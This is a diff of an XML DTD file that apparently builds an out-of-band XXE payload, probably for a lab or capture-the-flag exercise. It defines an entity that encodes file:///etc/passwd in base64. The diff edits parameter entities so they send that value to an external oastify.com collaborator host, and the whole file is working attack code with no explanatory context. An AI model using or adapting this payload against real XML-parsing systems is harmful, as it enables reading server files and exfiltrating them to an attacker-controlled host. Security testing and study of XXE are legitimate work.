@@ -2,14 +2,11 @@
 <!ENTITY % b SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
 <!ENTITY % test2 SYSTEM "http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=FLAG2">
 
-
-
-<!ENTITY % exfil1 SYSTEM "http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=FLAG3">
-<!ENTITY % abt "<!ENTITY % exfil SYSTEM 'http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=FLAG3'>">
+<!ENTITY % exfil1 SYSTEM "http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=%b">
+<!ENTITY % abt "<!ENTITY % exfil SYSTEM 'http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=%b'>">
 %test1;
 %b
 %test2;
-
 
 %exfil1;
 %abt;
